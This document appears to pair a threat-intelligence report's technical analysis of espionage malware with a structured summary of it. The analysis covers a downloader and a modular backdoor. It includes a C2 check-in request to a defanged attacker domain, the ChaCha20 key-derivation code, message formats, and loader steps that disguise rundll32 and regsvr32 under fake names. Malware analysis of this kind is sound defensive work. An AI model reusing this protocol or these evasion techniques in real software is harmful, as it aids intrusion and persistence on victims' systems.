@@ -1,0 +1,513 @@
+
+
+
+Sentence : 3 TECHNICAL ANALYSIS OF DELIVERED MALWARE AND TOOLS
+As mentioned in the Attacker tools and techniques section, the attackers used a number of malicious tools,
+including Stages 1 and 2 of their custom malware, and modified versions of open-source tools.
+The custom malware is technically advanced, with heavy obfuscation used and several anti-analysis
+techniques implemented. To our knowledge, this malware has not been previously documented.
+In the following sections, we provide a technical analysis of the malicious tools found during the
+investigation, with special focus on the custom backdoor used as Stage 2 in the attacks.
+3.1 Stage 1: Custom downloader
+As mentioned in the Initial compromise section, the attackers tricked the targets into opening malicious
+files, which led to the creation of a scheduled task. Once the task was triggered, a remote XSL script was
+executed via ~~WMIC~~ that downloaded the Stage 1 DLL – the custom downloader – in a base64-encoded
+form and decoded it using the ~~certutil~~ utility. In a later stage of the attack, we noticed the malware
+was registered as a service to ensure persistence on the system, thus not relying on being executed by
+the remote XSL script anymore.
+Typically, the Stage 1 malware was executed using the ~~rundll32~~ utility; however, we also saw instances
+where the attackers used a custom DLL loader to run the malware.
+The main purpose of the Stage 1 malware is to download the Stage 2 payload and directly execute it in
+memory only. This downloader has the following functionality:
+   - Contact one of the hardcoded servers
+
+
+ - Communicate over HTTPS using hardcoded URLs
+
+
+ - Use of hardcoded HTTP headers
+
+
+   - Download the encrypted Stage 2 payload to its own memory space
+
+
+   - Decrypt the Stage 2 payload, which results in a DLL
+
+
+   - Load the Stage 2 malware
+
+
+   - Execute the Stage 2 malware
+
+The downloaded Stage 2 payload is TEA or (in later versions) AES-ECB encrypted. Stage 1 malware
+contains a hardcoded AES/TEA key necessary for decrypting the Stage 2 payload. Since the keys were
+changed multiple times during the operation, each Stage 2 payload can only be decrypted by a key
+hardcoded in the matching Stage 1 malware.
+As previously mentioned, the attackers modified the Stage 1 malware multiple times over the course of
+the operation. We identified the following changes:
+   - Switch from TEA to AES-ECB
+
+
+   - Addition of a local proxy IP
+
+
+   - Implementation of raw sockets TCP communication
+
+   - Hardcoding of specific paths containing a victim’s username
+
+The attackers have employed a number of anti-analysis techniques in their custom malware.
+Control-flow flattening, a type of compiler-level obfuscation (depicted in Figure 9), is used in both Stage
+1 and 2. A similar use of this technique was previously seen for example in malware attributed to APT10
+and the Lazarus group (see the Attribution hints section).
+10 Operation In(ter)ception: Targeted attacks against European aerospace and military companies TLP: WHITE
+Figure 9 // Example of the control-flow flattening obfuscation used in Stage 1 malware:
+routine that receives the next-stage payload
+The malware authors also used dynamic API loading to thwart analysis, in both Stage 1 and 2. Figure 10
+shows an example of this technique as used in the Stage 1 malware. For a detailed explanation of
+dynamic API loading, please refer to the 2016 Novetta report Operation Blockbuster, page 34.
+Figure 10 // Example of dynamic API loading in Stage 1 malware: part of the routine that receives the next-stage payload
+3.2 Stage 2: Custom backdoor
+The malware executed in-memory by the Stage 1 malware is a modular backdoor in the form of a DLL
+written in C++. It periodically sends requests to the server and performs defined actions based on the
+received commands, such as make a host fingerprint, load a module, or change the configuration.
+During our investigation, we did not find any modules received by the Stage 2 malware from its C&C
+server. However, our telemetry shows that the Stage 2 malware downloaded a DLL based on a publicly
+available tool modified to only interpret PowerShell commands (see the PowerShell DLL section). Based
+on the format of this DLL, we know it’s not a module for the Stage 2 malware but rather an additional
+standalone component. Since the Stage 2 malware does not possess any downloading functionality
+(with the exception of configuration files and encrypted modules), we believe a module was used to
+download this DLL.
+11 Operation In(ter)ception: Targeted attacks against European aerospace and military companies TLP: WHITE
+3.2.1 Bootstrap
+Upon its execution, the backdoor first creates instances of a set of classes. This part is interesting,
+because each class in this set is represented by an ID and provides a particular functionality such as
+encryption/decryption, HTTP communication, configuration processing, or module processing. Thus, this
+set defines the base capability of the backdoor. As we later describe in the section Supported commands,
+the C&C server can instruct the backdoor to enlist all the instantiated classes and loaded modules,
+presumably to determine the current capabilities of the backdoor.
+After instantiating the class objects, the backdoor checks whether a configuration file already exists
+in a predetermined path. If it does, the config is loaded; otherwise, hardcoded values are used and
+subsequently, the config is written to disk. Also, the backdoor checks whether there are any stored
+modules. If so, the backdoor decrypts them and loads them. Finally, the backdoor attempts to contact
+the C&C server and requests commands.
+3.2.2 Configuration
+In the Bootstrap section, we mentioned the backdoor attempts to load the configuration file from a
+hardcoded path (e.g. ~~C:\Users\<USER>\AppData\Local\NTUSER45F7.POL~~ ) on its startup. The
+configuration file is encrypted by a modified RC4 (see the Appendix ), using a hardcoded key, and has the
+format shown in Table 1.
+Offset Size (bytes) Content
+0 4 Value 0x77 or 0x78
+4 16 Time in SYSTEMTIME format
+20 1000 Configuration entry
+… … (optional) Other configuration entries
+Table 1 // Format of a configuration file
+Even though the size of the configuration entry is 1000 bytes, it contains only the domain of a C&C
+server. The rest consists of uninitialized data that is not used during the configuration file loading.
+Further, the configuration file may contain multiple configuration entries, where each entry holds the
+domain of a different C&C server.
+3.2.3 Modules
+After loading the configuration, the backdoor proceeds to load all stored modules. The path to the folder
+containing the modules is hardcoded (e.g. ~~C:\Users\<USER>\AppData\Local\Temp~~ ) and the name of
+a module file has a defined prefix (e.g. ~~~DF4B~~ ) and extension (e.g. ~~.cav~~ ). The data contained in a module
+file has the format shown in Table 2.
+Offset Size (bytes) Content
+0 1 Module storage type;
+Value 0x1 or 0x2
+1 64 AES key material;
+Only if module storage type == 0x2
+1 or 65 X AES-CBC-encrypted data
+Table 2 // Module file format
+12 Operation In(ter)ception: Targeted attacks against European aerospace and military companies TLP: WHITE
+As one can observe, there are two types of storage. In the case where the first byte of the module file is
+0x2, the following 64 bytes contains the key material (in hexadecimal) that is used for AES session key
+generation using the MakeKey() method. The rest of the data is AES-CBC encrypted and contains the
+module.
+However, when the first byte of the module file is 0x1, the key material is missing. In this case, the
+backdoor uses key material stored in its memory to generate the session key. It is worth noting that on
+the startup of the backdoor, there is no key material present in the memory and the backdoor may later
+obtain it as a part of a received command (see the section Supported commands ).
+Nevertheless, once the session key is generated, the module data is decrypted using a specific
+implementation of AES that can be found on GitHub . After the decryption, the module data has the
+format described in Table 3.
+Offset Size (bytes) Content
+0 4 Module ID
+4 4 Length of the first export name
+8 4 Length of the second export name
+12 4 Length of the third export name
+16 4 Length of the fourth export name
+20 4 DLL Size
+24 Length of the first export name First export name (must be NULL- terminated)
+E1 = 24 + length of Export 1 Name Length of the second export name Second export name (must be NULL- terminated)
+E2 = E1 + length of Export 2 Name Length of the third export name Third export name (must be NULL- terminated)
+E3 = E2 + length of Export 3 Name Length of the fourth export name Fourth export name (must be NULL- terminated)
+E3 + length of Export 4 Name DLL size DLL
+Table 3 // Format of stored module data
+As can be seen from the table, every module is a DLL consisting of at most four export functions. Once
+the module data is decrypted, the backdoor loads the module and invokes the first, third, and fourth
+export respectively. After that, the backdoor stores the necessary module data along with the module
+ID into a list dedicated to hold the information about loaded modules. This process is repeated for each
+module file.
+13 Operation In(ter)ception: Targeted attacks against European aerospace and military companies TLP: WHITE
+3.2.4 Network protocol
+When the configuration and the modules are loaded, the backdoor contacts the server over HTTPS using
+one of the domain names in the configuration and concatenates it with a path to one of the ASP files
+from a hardcoded list.
+The referred ASP filenames contain innocuous-looking strings with various names, topics, and events,
+presumably to deceive anyone monitoring the traffic. Examples of hardcoded ASP filenames:
+   - politicia.asp
+
+
+   - taxing-churc.asp
+
+
+   - exports-to-Turkey.asp
+
+
+   - Climate.asp
+
+
+   - discoveries.asp
+
+
+   - pay-talks-fai.asp
+
+
+   - Nouvelles.asp
+
+
+   - News.asp
+
+
+   - Noticias.asp
+
+
+   - EU-nominee.asp
+
+
+   - Business.asp
+
+
+   - Culture.asp
+
+
+   - Life-Work.asp
+
+
+   - Comercio.asp
+
+
+   - Links.asp
+
+
+   - churc.asp
+
+
+   - products.asp
+
+
+   - exports.asp
+
+Further, similarly to the Stage 1 malware, hardcoded HTTP headers are used in the communication. In
+this case, however, there are multiple hardcoded headers and one of them is randomly selected upon
+request (see an example of such a header in Figure 11).
+In the HTTPS communication, the backdoor (henceforth referred to as the “client” in this section) uses
+a custom communication protocol based on HTTP GET requests, where the messages are placed in the
+HTTP request body. This is an unusual approach, but the HTTP specification does not explicitly prohibit
+the inclusion of a message body in a GET request. Figure 11 depicts an example of such a request.
+```
+      GET https://chuta[.]jp/jtool/politicia.asp HTTP/1.1
+  Cache-Control: max-age=0
+  Upgrade-Insecure-Requests: 1
+  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/
+  apng,*/*;q=0.8
+
+```
+Accept-Encoding: gzip, deflate
+```
+      Accept-Language: en-US,en;q=0.9
+      User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2;
+      .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0;
+  .NET4.0C; .NET4.0E)
+  Host: chuta.jp
+  Content-Length: 16
+  Connection: Keep-Alive
+
+  0BF4BE00001CE23D
+
+```
+Figure 11 // Example of GET request containing a message (bolded) in its body
+14 Operation In(ter)ception: Targeted attacks against European aerospace and military companies TLP: WHITE
+Table 4 defines the format of the messages passed in the message body.
+Offset Size Content
+0 1 Random value in range [0…254]
+1 1 Hardcoded value 0xF4
+2 1 Random value in range [0…254]
+3 1 Message ID [0…3]
+4 4 Client ID
+8 Variable (Optional) Additional data
+Table 4 // Format of the messages sent to the C&C server
+So, if we look at the request example (see Figure 11), the message in this case would be decoded as in
+Table 5.
+Offset Size Content
+0 1 Random value: 0x0B
+1 1 0xF4
+2 1 Random value: 0xBE
+3 1 Message ID: 0x00
+4 4 Client ID: 0x001CE23D
+8 0 No additional data
+Table 5 // Example of a message sent to a server
+If the message contains additional data, the data is always base64 encoded. After decoding, the format
+is as described in Table 6.
+Offset Size Content
+0 4 Size of data
+4 Variable Encrypted data
+Table 6 // Format of additional data in a message
+The decoded data is further encrypted either by a modified RC4 algorithm or ChaCha20, depending on
+the stage of the communication (see section Session ).
+15 Operation In(ter)ception: Targeted attacks against European aerospace and military companies TLP: WHITE
+3.2.4.1 Client ID
+Before sending the first message to the C&C server, the client generates a pseudorandom ID (e.g.
+0x001CE23D as in the example in Figure 11). This Client ID will be used for all requests that the client
+sends to the server in an established session. This means that for every session, a new Client ID is
+generated.
+3.2.4.2 Session
+The session is composed of two stages: ChaCha20 nonce exchange, and commands execution. Figure 12
+and Figure 14 represent the complete communication in a session.
+3.2.4.2.1 Stage 1 – Exchange ChaCha20 nonce
+In the first stage, the goal is to establish ChaCha20 contexts, which are then used in the second stage of
+the communication. The flow of this stage is depicted in Figure 12.
+Client Server
+Figure 12 // Session first stage: successful exchange of ChaCha20 nonces
+3.2.4.2.1.1 Message ID 0 – Initial check-in
+This is the first message the client sends to the server. The expected response from the server is either
+~~c3VjY2V2cyE=~~ (indicating success) or ~~ZmFpbGVKlQ==~~ (indicating an error on the server). On an error,
+the client tries to contact another server. Although these “success” and “error” strings appear to be
+base64-encoded strings, the malware does not decode them, but rather just checks for these literal
+values.
+3.2.4.2.1.2 Message ID 1 – Obtain server’s ChaCha20 nonce
+Once the initial check-in is successfully passed, the client sends a message with ID 1. The server response
+contains base64-encoded data of the “additional data” format described above. After the base64
+decoding, the data is further encrypted by a modified RC4 (see the Appendix ). To decrypt the encrypted
+data from the received message, the client uses a hardcoded key.
+16 Operation In(ter)ception: Targeted attacks against European aerospace and military companies TLP: WHITE
+The decrypted data is expected to be a string consisting of 24 hexadecimal digits. The client will parse
+the string using ~~scanf(..,”%02X”...)~~ and use the result as a nonce in the ChaCha20 context
+initialization, which comes immediately afterward. This context will be later used for encryption of
+every data stream sent to the server. The key, which is necessary along with the nonce for creating the
+ChaCha20 context, is derived by the algorithm presented in Figure 13.
+```
+      UInt32 v3 = clientID + 0x11111111;
+  byte[] chachaKey = new byte[32];
+
+  chachaKey[0] = 0;
+  for (int i = 1; i < 32; i++)
+  chachaKey[i] = (byte)(chachaKey[i - 1] + ((UInt32)(v3 * i) >> i));
+
+```
+Figure 13 // ChaCha20 key derivation algorithm
+3.2.4.2.1.3 Message ID 2 – Send client’s ChaCha20 nonce
+Next, the client will generate 12 pseudorandom bytes, which are used as a nonce for the second
+ChaCha20 context. This context will be used for decryption of every data stream received from the
+server. Note that the key used for this context initialization is the same as in the first case. This means
+the contexts are created using the same key; however, the nonce differs.
+The generated nonce is then formatted as a hex string and subsequently encrypted by the modified
+RC4 algorithm, using the same key as in the previous case. Next, the result is sent as additional data in
+a message with ID 2 to the server. The response from the server can be arbitrary – the client discards it
+upon receipt. After discarding the response, the context is initialized, and the backdoor proceeds to the
+second stage of communication.
+3.2.4.2.1.4 Message ID 3 – Error occurred
+If anything goes wrong in this stage, the client sends a message of ID 3 to indicate to the server that an
+error occurred. The additional data in the message contains a string ~~ZnNrbGNz~~ ( ~~fsklcs~~ when base64
+decoded). The client does not expect any response from the server and sleeps for a certain amount of
+time. When the time is up, it contacts the server again.
+3.2.4.2.2 Stage 2 – Request and execute commands
+Once the ChaCha20 nonces are exchanged and the contexts are established, the communication moves
+to the second stage, which is dedicated to receiving commands and performing actions based on them.
+The command requests are sent to the server until the server responds with a specific command to
+terminate the communication. The flow of this stage is depicted in Figure 14.
+17 Operation In(ter)ception: Targeted attacks against European aerospace and military companies TLP: WHITE
+Client
+Server
+|1 Request command|Col2|
+|---|---|
+|Additional data-~~Command data~~|Additional data-~~Command data~~|
+|2Command result|2Command result|
+|Additional dataResponse~~Arbitrary data~~|Additional dataResponse~~Arbitrary data~~|
+|1...Request command|1...Request command|
+|Additional data-~~Command data~~|Additional data-~~Command data~~|
+|3Terminate communicationTerminate communication|3Terminate communicationTerminate communication|
+|Additional data|ZnNrbGNz|
+Figure 14 // Session second stage: the client requests commands until the server instructs it to terminate the communication
+3.2.4.2.2.1 Message ID 1 – Request command
+The client sends message with ID 1 to request a command from the server. The expected response from
+the server contains data in the “additional data” format encrypted by ChaCha20 under base64 encoding.
+After the decryption, the data holds the command ID and other data necessary to successfully execute
+the command. In the section Supported commands, one can observe the commands supported by the
+backdoor.
+3.2.4.2.2.2 Message ID 2 – Command result
+When the command is performed, the result is sent back to the server in a message with ID 2 as
+additional data. Also, as in the first stage, the client does not expect any particular response from the
+server; the response is discarded upon receipt.
+3.2.4.2.2.3 Message ID 3 – Communication termination upon request / Error occurred
+The client keeps sending command requests to the server until a specific command is received indicating
+the server wishes to stop the communication. Once this command is received, the client sends a
+message of ID 3, instead of a message of ID 2, as a confirmation.
+Alternatively, the client sends a message of ID 3 in the cases where an error occurred.
+In both cases, the additional data in the message contains the string ~~ZnNrbGNz~~ ~~.~~ After sending the
+message, the client sleeps for a certain amount of time, and then contacts the server again.
+18 Operation In(ter)ception: Targeted attacks against European aerospace and military companies TLP: WHITE
+3.2.5 Supported commands
+Table 7 presents the commands supported by the analyzed sample.
+Offset Content
+0x00000001 Receive AES key string for module file encryption/decryption, and list initialized classes and modules
+0x00000002 Receive and load module
+0x00000005 Unknown
+0x00000006 Delete all stored module files
+0x00000030 Create host fingerprint
+0x01000001 Execute a routine from a specified class instance
+0x01000002 Execute a routine from a specified class instance
+0x01000003 Execute a routine from a specified class instance
+0x01000004 Execute a routine from a specified class instance
+0x10000001 Set sleep period
+0x10000002 Set received time in configuration and write the current configuration to a file
+0x10000003 Reload configuration from file and send it to the server
+0x10000004 Receive configuration and write it to a file
+0x10000006 Terminate communication
+0x11111111 No operation
+Other Execute particular export function of a specified module
+Table 7 // List of supported commands
+3.2.6 Anti-analysis techniques
+As for anti-analysis techniques, similar to the custom downloader (Stage 1), the custom backdoor also
+features control-flow flattening and dynamic API loading (see the section Stage 1: Custom downloader ).
+For the backdoor, however, the attackers used a different method for resolving the APIs. The necessary
+APIs are resolved on bootstrap and the pointers are stored in an array for later use, as seen in Figure
+
+More precisely, for every class that has an assigned ID (we mentioned these classes in the section
+
+Bootstrap ), there exists a function that resolves the APIs used by such a class. As one can see from
+Figure 15, this leads to redundancy (e.g. ~~CloseHandle_3, GetFileSize_2~~ ~~)~~ . On the other hand, it may
+indicate the backdoor is composed of several modules (in the sense of modular programming ) that are
+independent to each other. This is further supported by the existence of the command ~~0x01~~ ~~,~~ which is
+described in the section Supported commands .
+19 Operation In(ter)ception: Targeted attacks against European aerospace and military companies TLP: WHITE
+Figure 15 // Example of the custom backdoor’s dynamic API loading
+3.3 PowerShell DLL
+Another component we discovered in our investigation is a modified version of PowerShdll, a publicly
+available tool for running PowerShell code that does not require access to ~~powershell.exe~~ ~~,~~ thanks to
+using PowerShell automation DLLs.
+The attackers customized the tool to have only one export routine that accepts one string as a
+parameter and passes it to the PowerShell DLLs for interpretation. The result given by PowerShell is
+then returned. All other functionality implemented in the original source code has been stripped.
+As mentioned in the previous section, this DLL was delivered and utilized by the custom backdoor.
+20 Operation In(ter)ception: Targeted attacks against European aerospace and military companies TLP: WHITE
+3.4 Custom DLL loaders
+As previously mentioned, besides the ~~rundll32~~ utility, the attackers also used custom DLL loaders to
+execute their malware. We found two versions of such loaders.
+One version simply loads the DLL and executes it using its export ~~DllRegisterServer~~ as the main
+routine. The second version is more complicated – it either uses the same method as the first one, or
+performs the following sequence:
+   - Execute ~~`regsvr32`~~ utility with the path to the malicious DLL as a parameter
+
+
+   - Execute ~~`rundll32`~~ utility with the same DLL, using the ~~`DllRegisterServer`~~ export
+
+
+   - Copy ~~`regsvr32`~~ to ~~`C:\NVidia\NvDaemon.exe`~~ ~~,~~ run it with the DLL as a parameter, and delete the
+
+copied ~~C:\NVidia\NvDaemon.exe~~
+   - Copy ~~`rundll32`~~ to ~~`C:\ProgramData\Skype\Skype.exe`~~ ~~,~~ run it with the DLL and its
+
+~~DllRegisterServer~~ export as parameters, and delete the copied ~~C:\ProgramData\Skype\~~
+```
+     Skype.exe
+```
+We are unsure about the reason for using these custom loaders, but we assume the attackers were
+either testing the environment or resolving some issues.
+3.5 Beacon DLL
+Another component found during the investigation is a DLL with very simple functionality – after
+execution, the DLL connects to a specific hardcoded IP address, makes an HTTP request, and then
+terminates. We suspect that the attackers used this DLL to verify that the connection is, for example,
+not blocked by a corporate firewall.
+3.6 Infrastructure
+The malicious tools were always hosted on multiple servers. The attackers sometimes used
+compromised, but otherwise legitimate, servers, but other times used their own servers. The hardcoded
+domains and IP addresses varied between the different malicious tools used, and often changed when
+the malware was recompiled and delivered again.
+It is worth noting that both the legitimate servers and the servers managed by the attackers used
+Windows operating systems and Microsoft’s IIS as a web server. Determining how the attackers
+managed to compromise the legitimate servers was out of scope of our investigation.
+Output : 
+### Analysis of Malware Components in Operation In(ter)ception
+
+#### 1. Custom Backdoor (Stage 2)
+The custom backdoor is a sophisticated piece of malware designed to maintain persistent access and control over infected systems. Here are the key features:
+
+- **Module Loading and Execution**:
+  - The backdoor can receive, decrypt, and execute module files.
+  - It supports loading modules with up to four export functions.
+  - Modules are stored and managed by the backdoor.
+
+- **Network Communication**:
+  - Uses a custom protocol over HTTP/HTTPS to communicate with C2 (Command and Control) servers.
+  - Employs ChaCha20 for encryption of command data and responses.
+  - Communicates through a series of messages with specific IDs to request commands, send results, and handle errors.
+
+- **Commands Supported**:
+  - **0x00000001**: Receive AES key for module file encryption/decryption and list initialized classes and modules.
+  - **0x00000002**: Receive and load a new module.
+  - **0x00000006**: Delete all stored module files.
+  - **0x01000001** to **0x01000004**: Execute specific routines from class instances.
+  - **0x10000001**: Set the sleep period.
+  - **0x10000002**: Set received time in configuration and write it to a file.
+  - **0x10000003**: Reload configuration from file and send it to the server.
+  - **0x10000004**: Receive new configuration and write it to a file.
+  - **0x10000006**: Terminate communication.
+  - **0x11111111**: No operation.
+  - **Other**: Execute specific export functions of modules.
+
+- **Anti-Analysis Techniques**:
+  - Control-flow flattening to obfuscate the control flow and make static analysis difficult.
+  - Dynamic API loading to resolve necessary APIs at runtime, storing pointers in an array for later use.
+  - Redundancy in API resolution suggests modularity in the backdoor's design.
+
+#### 2. PowerShell DLL
+- **Functionality**:
+  - A modified version of PowerShdll, a tool that allows running PowerShell code without requiring access to `powershell.exe`.
+  - Contains only one export routine that accepts a string parameter and passes it to PowerShell for execution.
+  - Stripped of other functionalities from the original source code.
+
+- **Usage**:
+  - Delivered and utilized by the custom backdoor to execute PowerShell commands.
+
+#### 3. Custom DLL Loaders
+- **Versions**:
+  - **Simple Loader**: Loads a DLL and executes it using the `DllRegisterServer` export as the main routine.
+  - **Complex Loader**: Executes a sequence of actions including:
+    - Running `regsvr32` with the path to the malicious DLL.
+    - Running `rundll32` with the same DLL, using the `DllRegisterServer` export.
+    - Copying `regsvr32` to `C:\NVidia\NvDaemon.exe`, running it with the DLL, and deleting the copied file.
+    - Copying `rundll32` to `C:\ProgramData\Skype\Skype.exe`, running it with the DLL and its `DllRegisterServer` export, and deleting the copied file.
+
+- **Purpose**:
+  - Likely used for testing the environment or resolving issues in the malware's execution.
+
+#### 4. Beacon DLL
+- **Functionality**:
+  - Connects to a specific hardcoded IP address.
+  - Sends an HTTP request.
+  - Terminates after the request is made.
+
+- **Usage**:
+  - Suspected to be used by attackers to verify network connectivity and ensure that connections are not blocked by corporate firewalls.
+
+#### 5. Infrastructure
+- **Hosting**:
+  - Malicious tools were hosted on multiple servers, including compromised legitimate servers and attacker-managed servers.
+  - Hardcoded domains and IP addresses varied between different tools and often changed with recompilation and redeployment.
+
+- **Server Configuration**:
+  - Both legitimate and attacker-managed servers used Windows operating systems and Microsoft IIS as the web server.
+  - The method of compromising legitimate servers was not within the scope of the investigation.
+
+### Conclusion
+The malware components in Operation In(ter)ception demonstrate a high level of sophistication, with features such as custom backdoors, dynamic API loading, and anti-analysis techniques. The use of multiple loaders and a beacon DLL indicates a well-planned operation designed to maintain persistence and evade detection. The infrastructure used by the attackers is diverse and adaptable, making it challenging to track and mitigate their activities.
